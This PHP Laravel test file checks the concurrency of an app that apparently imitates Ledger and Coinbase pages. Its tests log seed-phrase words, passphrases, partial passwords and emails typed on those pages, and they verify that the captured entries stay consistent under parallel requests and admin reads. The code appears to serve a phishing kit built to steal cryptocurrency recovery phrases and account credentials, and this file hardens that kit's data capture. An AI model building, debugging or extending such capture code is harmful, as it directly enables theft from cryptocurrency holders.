<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Str;
use Tests\TestCase;

class ActivityV2InnoDbConcurrencyTest extends TestCase
{
    private array $mysql;

    private string $database;

    protected function setUp(): void
    {
        parent::setUp();

        $host = getenv('ACTIVITY_V2_MYSQL_HOST') ?: '127.0.0.1';
        $port = getenv('ACTIVITY_V2_MYSQL_PORT') ?: '3306';
        $user = getenv('ACTIVITY_V2_MYSQL_USER') ?: 'root';
        $pass = getenv('ACTIVITY_V2_MYSQL_PASS') !== false ? getenv('ACTIVITY_V2_MYSQL_PASS') : '';
        $this->database = 'liveled_v2_docid_qa';
        $this->mysql = [
            'host' => $host,
            'port' => $port,
            'database' => $this->database,
            'username' => $user,
            'password' => $pass,
        ];

        try {
            $pdo = new \PDO(
                "mysql:host={$host};port={$port}",
                $user,
                $pass,
                [\PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION]
            );
        } catch (\Throwable $e) {
            $this->markTestSkipped('MySQL/MariaDB not available for InnoDB suite: '.$e->getMessage());
        }

        $pdo->exec('CREATE DATABASE IF NOT EXISTS `'.$this->database.'` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci');
        $pdo->exec('DROP DATABASE `'.$this->database.'`');
        $pdo->exec('CREATE DATABASE `'.$this->database.'` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci');

        config([
            'database.default' => 'mysql',
            'database.connections.mysql.host' => $host,
            'database.connections.mysql.port' => $port,
            'database.connections.mysql.database' => $this->database,
            'database.connections.mysql.username' => $user,
            'database.connections.mysql.password' => $pass,
            'database.connections.mysql.engine' => 'InnoDB',
        ]);
        DB::purge('mysql');
        DB::reconnect('mysql');
        Artisan::call('migrate', ['--force' => true]);

        $this->withoutMiddleware([
            ThrottleRequests::class,
        ]);

        foreach (['user_sessions', 'user_events'] as $table) {
            $row = DB::selectOne(
                'SELECT ENGINE AS engine FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ?',
                [$table]
            );
            $this->assertSame('InnoDB', $row->engine ?? null);
        }
        $this->assertTrue(Schema::hasColumn('user_sessions', 'document_id'));
        $this->assertTrue(Schema::hasColumn('user_sessions', 'document_issued_at'));
    }

    protected function tearDown(): void
    {
        try {
            DB::disconnect('mysql');
            $pdo = new \PDO(
                "mysql:host={$this->mysql['host']};port={$this->mysql['port']}",
                $this->mysql['username'],
                $this->mysql['password'],
                [\PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION]
            );
            $pdo->exec('DROP DATABASE IF EXISTS `'.$this->database.'`');
        } catch (\Throwable $e) {
        }
        parent::tearDown();
    }

    public function test_innodb_overlapping_gets_and_delayed_old_documents(): void
    {
        $token = Str::random(48);
        $workers = [];
        for ($i = 0; $i < 12; $i++) {
            $workers[] = $this->spawn([
                'action' => 'get',
                'token' => $token,
                'path' => ($i % 3 === 0) ? '/ledger/loading' : '/ledger/3',
                'count' => 1,
            ]);
        }
        $results = $this->awaitAll($workers);
        $this->assertNotEmpty($results);

        $session = UserSession::where('session_token', $token)->first();
        $this->assertNotNull($session);
        $this->assertMatchesRegularExpression('/^[a-f0-9]{32}$/', (string) $session->document_id);

        foreach ($results as $r) {
            foreach ($r['docs'] ?? [] as $doc) {
                $res = $this->withCookie('liveled_token', $token)->post('/api/log', [
                    'type' => 'page_visit',
                    'page' => 'ledger_3',
                    'doc' => $doc,
                ]);
                if ($doc === $session->document_id) {
                    $res->assertOk();
                } else {
                    $res->assertStatus(409);
                }
            }
        }
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $session->document_id,
        ])->assertOk();
        $this->assertSame(0, $this->corruptCount($token));
    }

    public function test_innodb_same_session_parallel_events_and_admin_read(): void
    {
        $token = Str::random(48);
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $stay = $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
        ])->assertOk()->json('stay');

        $workers = [];
        foreach ([2, 10, 20] as $n) {
            $workers[] = $this->spawn([
                'action' => 'event',
                'token' => $token,
                'type' => 'phrase_input',
                'page' => 'ledger_3',
                'element' => 'full_state',
                'value' => json_encode(['words' => ['parallel'.$n], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
                'count' => $n,
            ]);
        }
        $admin = $this->spawn([
            'action' => 'get',
            'token' => $token,
            'path' => '/ledger/3',
            'count' => 1,
        ]);
        $results = $this->awaitAll($workers);
        $this->awaitAll([$admin]);

        foreach ($results as $r) {
            $this->assertTrue($r['ok'] ?? false, $r['error'] ?? 'worker failed');
            foreach ($r['codes'] as $code) {
                $this->assertContains($code, [200, 409]);
            }
        }

        $session = UserSession::where('session_token', $token)->first();
        $this->assertSame(0, $this->corruptCount($token));
        $this->assertCount(1, $session->activity_summary['attempts']['ledger_3'] ?? []);
        $this->assertContains($session->activity_summary['attempts']['ledger_3'][0]['state'], ['active', 'sealed']);
    }

    public function test_innodb_many_sessions_and_reconnect_read(): void
    {
        $ops = 0;
        $tokens = [];
        for ($s = 0; $s < 30; $s++) {
            $tokens[] = Str::random(48);
        }

        $workers = [];
        foreach ($tokens as $i => $token) {
            $path = ($i % 2 === 0) ? '/ledger/3' : '/coinbase/seed';
            $workers[] = $this->spawn([
                'action' => 'get',
                'token' => $token,
                'path' => $path,
                'count' => 1,
            ]);
        }
        $this->awaitAll($workers);
        $ops += count($tokens);

        foreach ($tokens as $i => $token) {
            $session = UserSession::where('session_token', $token)->first();
            $this->assertNotNull($session);
            $page = ($i % 2 === 0) ? 'ledger_3' : 'coinbase_seed';
            $ack = $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => $page,
                'doc' => $session->document_id,
            ]);
            $ack->assertOk();
            $ops++;
            $stay = (int) $ack->json('stay');
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'phrase_input',
                'page' => $page,
                'element' => 'full_state',
                'value' => json_encode(['words' => ['s'.$i], 'passphrase' => '']),
                'doc' => $session->document_id,
                'stay' => $stay,
            ])->assertOk();
            $ops++;
        }

        for ($s = 0; $s < 20; $s++) {
            $tokens[] = Str::random(48);
            $token = $tokens[count($tokens) - 1];
            $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
            $ops++;
            $doc = UserSession::where('session_token', $token)->value('document_id');
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => 'ledger_3',
                'doc' => $doc,
            ])->assertOk();
            $ops++;
        }

        DB::disconnect('mysql');
        DB::reconnect('mysql');
        $this->assertGreaterThanOrEqual(50, UserSession::count());
        foreach (UserSession::all() as $session) {
            $this->assertSame(0, $this->corruptCount($session->session_token));
        }
        $this->assertGreaterThanOrEqual(120, $ops);
    }

    public function test_innodb_lock_wait_then_commit_and_storm(): void
    {
        $token = Str::random(48);
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
        ])->assertOk();

        $holder = $this->spawn([
            'action' => 'hold_then_event',
            'token' => $token,
            'doc' => $doc,
            'page' => 'ledger_3',
            'type' => 'page_visit',
            'hold_ms' => 250,
        ]);
        $waiter = $this->spawn([
            'action' => 'event',
            'token' => $token,
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
            'count' => 1,
        ]);
        $results = $this->awaitAll([$holder, $waiter]);
        foreach ($results as $r) {
            $this->assertTrue($r['ok'] ?? false, $r['error'] ?? 'lock worker failed');
            $this->assertContains($r['codes'][0] ?? 0, [200]);
        }

        $workers = [];
        for ($i = 0; $i < 20; $i++) {
            $workers[] = $this->spawn([
                'action' => 'get',
                'token' => $token,
                'path' => ($i % 2 === 0) ? '/ledger/3' : '/ledger/loading',
                'count' => 1,
            ]);
        }
        $gets = $this->awaitAll($workers);
        $current = UserSession::where('session_token', $token)->value('document_id');
        $ok = 0;
        $rejected = 0;
        foreach ($gets as $r) {
            foreach ($r['docs'] ?? [] as $d) {
                $status = $this->withCookie('liveled_token', $token)->post('/api/log', [
                    'type' => 'page_visit',
                    'page' => 'ledger_3',
                    'doc' => $d,
                ])->getStatusCode();
                if ($d === $current) {
                    $this->assertSame(200, $status);
                    $ok++;
                } else {
                    $this->assertSame(409, $status);
                    $rejected++;
                }
            }
        }
        $this->assertGreaterThan(0, $rejected);
        $this->assertSame(0, $this->corruptCount($token));
        $this->assertGreaterThanOrEqual(1, $ok + $rejected);
    }

    public function test_innodb_five_hundred_plus_ops_zero_corruption(): void
    {
        $ops = 0;
        $token = Str::random(48);
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $ops++;
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $stay = $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
        ])->assertOk()->json('stay');
        $ops++;

        $workers = [];
        for ($w = 0; $w < 20; $w++) {
            $workers[] = $this->spawn([
                'action' => 'event',
                'token' => $token,
                'type' => 'phrase_input',
                'page' => 'ledger_3',
                'element' => 'full_state',
                'value' => json_encode(['words' => ['storm'.$w], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
                'count' => 25,
            ]);
        }
        $results = $this->awaitAll($workers);
        foreach ($results as $r) {
            $this->assertTrue($r['ok'] ?? false, $r['error'] ?? 'storm worker failed');
            foreach ($r['codes'] as $code) {
                $this->assertContains($code, [200, 409]);
                $ops++;
            }
        }

        $this->assertGreaterThanOrEqual(500, $ops);
        $this->assertSame(0, $this->corruptCount($token));
        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3'] ?? [];
        $this->assertCount(1, $list);
        $this->assertSame((int) $stay, (int) $list[0]['attempt_id']);
        $this->assertContains($list[0]['state'], ['active', 'sealed']);
    }

    public function test_innodb_html_cas_older_start_cannot_reclaim(): void
    {
        for ($round = 0; $round < 25; $round++) {
            $token = Str::random(48);
            $t2 = microtime(true) - 0.2;
            $t1 = $t2 - 0.8;
            $t3 = $t2 + 0.4;
            $jobs = [
                ['request_time_float' => $t1, 'path' => '/ledger/3', 'sleep_ms' => 40 + ($round % 5) * 15],
                ['request_time_float' => $t2, 'path' => '/ledger/loading', 'sleep_ms' => ($round % 3) * 20],
                ['request_time_float' => $t3, 'path' => '/ledger/2', 'sleep_ms' => 0],
            ];
            shuffle($jobs);
            $workers = [];
            foreach ($jobs as $job) {
                $workers[] = $this->spawn([
                    'action' => 'get',
                    'token' => $token,
                    'path' => $job['path'],
                    'count' => 1,
                    'request_time_float' => $job['request_time_float'],
                    'sleep_ms' => $job['sleep_ms'],
                ]);
            }
            $results = $this->awaitAll($workers);
            $session = UserSession::where('session_token', $token)->first();
            $this->assertNotNull($session);
            $this->assertSame((int) round($t3 * 1_000_000), (int) $session->document_issued_at);
            $this->assertSame('ledger_2', $session->current_page);
            $winner = (string) $session->document_id;

            foreach ($results as $r) {
                foreach ($r['docs'] ?? [] as $doc) {
                    if ($doc !== $winner) {
                        $this->withCookie('liveled_token', $token)->post('/api/log', [
                            'type' => 'page_visit',
                            'page' => 'ledger_3',
                            'doc' => $doc,
                        ])->assertStatus(409);
                    }
                }
            }

            $late = $this->spawn([
                'action' => 'get',
                'token' => $token,
                'path' => '/ledger/3',
                'count' => 1,
                'request_time_float' => $t1,
                'sleep_ms' => 5,
            ]);
            $this->awaitAll([$late]);
            $session->refresh();
            $this->assertSame($winner, (string) $session->document_id);
            $this->assertSame((int) round($t3 * 1_000_000), (int) $session->document_issued_at);
            $this->assertSame('ledger_2', $session->current_page);

            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'page_visit',
                'page' => 'ledger_2',
                'doc' => $winner,
            ])->assertOk();
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => 'form_input',
                'page' => 'coinbase_password',
                'element' => 'password_partial',
                'value' => 'round-'.$round,
                'doc' => $winner,
            ])->assertOk();
            $session->refresh();
            $this->assertSame('round-'.$round, $session->activity_summary['boxes']['password']['value'] ?? null);
            $this->assertSame(0, $this->corruptCount($token));
        }
    }

    public function test_innodb_f5_navigation_lost_ack_and_stale_structured(): void
    {
        $token = Str::random(48);
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc1 = UserSession::where('session_token', $token)->value('document_id');
        $stay = (int) $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc1,
        ])->assertOk()->json('stay');
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['keep'], 'passphrase' => '']),
            'doc' => $doc1,
            'stay' => $stay,
        ])->assertOk();

        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc2 = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc1, $doc2);
        $ack = $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc2,
        ])->assertOk()->json();
        $this->assertSame($stay, (int) $ack['stay']);
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc2,
        ])->assertOk()->assertJsonPath('stay', $stay);
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3']);

        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['stale'], 'passphrase' => '']),
            'doc' => $doc1,
            'stay' => $stay,
        ])->assertStatus(409);

        $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
        $nav = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc2, $nav);
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc2,
        ])->assertStatus(409);
        $this->assertSame('coinbase_seed', UserSession::where('session_token', $token)->value('current_page'));
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'coinbase_seed',
            'doc' => $nav,
        ])->assertOk();
        $ledger = UserSession::where('session_token', $token)->first()->activity_summary['attempts']['ledger_3'][0];
        $this->assertSame('sealed', $ledger['state']);
        $this->assertSame(['keep'], $ledger['words']);
        $this->assertSame(0, $this->corruptCount($token));
    }

    public function test_innodb_stale_singleton_families(): void
    {
        $cases = [
            ['page' => 'coinbase_password', 'type' => 'form_input', 'element' => 'password_partial', 'first' => 'oldpw', 'next' => 'newpw', 'box' => 'password'],
            ['page' => 'coinbase_sign_in', 'type' => 'form_submit', 'element' => 'email', 'first' => 'old@example.com', 'next' => 'new@example.com', 'box' => 'email'],
        ];
        foreach ($cases as $case) {
            $token = Str::random(48);
            $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
            $old = UserSession::where('session_token', $token)->value('document_id');
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['first'],
                'doc' => $old,
            ])->assertOk();
            $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
            $current = UserSession::where('session_token', $token)->value('document_id');
            $events = UserEvent::where('session_token', $token)->count();
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
            ])->assertStatus(409);
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
                'doc' => $old,
            ])->assertStatus(409);
            $this->assertSame($events, UserEvent::where('session_token', $token)->count());
            $this->withCookie('liveled_token', $token)->post('/api/log', [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
                'doc' => $current,
            ])->assertOk();
            $box = UserSession::where('session_token', $token)->first()->activity_summary['boxes'][$case['box']]['value'] ?? null;
            $this->assertSame($case['next'], $box);
        }
    }

    private function spawn(array $job): array
    {
        $job['mysql'] = $this->mysql;
        $php = PHP_BINARY;
        $script = base_path('tests/bin/activity_v2_worker.php');
        $tmp = tempnam(sys_get_temp_dir(), 'v2j');
        file_put_contents($tmp, json_encode($job));
        $cmd = '"'.$php.'" "'.$script.'" "'.$tmp.'"';
        $spec = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = proc_open($cmd, $spec, $pipes, base_path());
        $this->assertIsResource($proc, 'failed to start worker');
        return ['proc' => $proc, 'pipes' => $pipes, 'job' => $tmp];
    }

    private function awaitAll(array $workers): array
    {
        $out = [];
        foreach ($workers as $w) {
            $stdout = stream_get_contents($w['pipes'][1]);
            $stderr = stream_get_contents($w['pipes'][2]);
            fclose($w['pipes'][1]);
            fclose($w['pipes'][2]);
            $code = proc_close($w['proc']);
            if (!empty($w['job']) && is_file($w['job'])) {
                @unlink($w['job']);
            }
            $decoded = json_decode((string) $stdout, true);
            if (!is_array($decoded)) {
                $this->fail('worker did not return JSON. code='.$code.' stdout='.$stdout.' stderr='.$stderr);
            }
            $out[] = $decoded;
        }
        return $out;
    }

    private function corruptCount(string $token): int
    {
        $session = UserSession::where('session_token', $token)->first();
        if (!$session) {
            return 1;
        }
        $summary = is_array($session->activity_summary) ? $session->activity_summary : [];
        $attempts = $summary['attempts'] ?? [];
        $bad = 0;
        foreach ($attempts as $page => $list) {
            if (!is_array($list)) {
                $bad++;
                continue;
            }
            $active = 0;
            $ids = [];
            foreach ($list as $row) {
                if (!is_array($row) || empty($row['attempt_id'])) {
                    $bad++;
                    continue;
                }
                $id = (int) $row['attempt_id'];
                if (in_array($id, $ids, true)) {
                    $bad++;
                }
                $ids[] = $id;
                if (($row['state'] ?? '') === 'active') {
                    $active++;
                }
                if (($row['state'] ?? '') === 'sealed' && array_key_exists('words', $row) && !is_array($row['words'])) {
                    $bad++;
                }
            }
            if ($active > 1) {
                $bad++;
            }
        }
        $events = UserEvent::where('session_token', $token)->count();
        if ($events < 0) {
            $bad++;
        }
        return $bad;
    }
}
